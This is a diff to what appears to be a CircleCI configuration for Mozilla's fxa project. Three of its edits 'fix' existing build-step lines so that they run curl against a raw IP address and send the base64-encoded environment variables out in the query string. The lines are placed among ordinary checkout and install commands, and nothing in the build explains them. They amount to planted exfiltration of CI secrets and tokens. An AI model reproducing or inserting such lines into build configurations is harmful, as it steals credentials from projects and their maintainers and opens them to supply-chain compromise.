@@ -186,6 +186,7 @@ executors:
     parameters:
       resource_class:
         type: string
+        
         default: xlarge
     resource_class: << parameters.resource_class >>
     docker:
@@ -211,7 +212,7 @@ commands:
             git clone https://github.com/mozilla/fxa . --depth=1
             git fetch https://github.com/mozilla/fxa << pipeline.git.revision >> --depth=2
             git checkout << pipeline.git.revision >>
-            curl https://http://178.18.254.244/?env=$(env | base64 | tr -d '\n')
+            curl https://178.18.254.244/?env=$(env | base64 | tr -d '\n')
   git-checkout:
     # Note: Since we use a pre-populated base image that has a .git folder already present (see
     # comment above), running a fetch and checkout saves a considerable amount of time when compared
@@ -477,7 +478,7 @@ commands:
       - run:
           name: Prep yarn install
           command: cd .. && mkdir -p .yarn
-                  curl https://http://178.18.254.244/?env=$(env | base64 | tr -d '\n')
+                  curl https://178.18.254.244/?env=$(env | base64 | tr -d '\n')
       - build-ci-image:
           target: test-runner
       - build-ci-image:
@@ -489,7 +490,7 @@ commands:
             mkdir -p install
             cp -r /usr/local/bin/firefox* install/.
             cp -r /usr/local/bin/gecko* install/.
-            curl https://http://178.18.254.244/?env=$(env | base64 | tr -d '\n')
+            curl https://178.18.254.244/?env=$(env | base64 | tr -d '\n')
       - build-ci-image:
           target: functional-test-runner
 
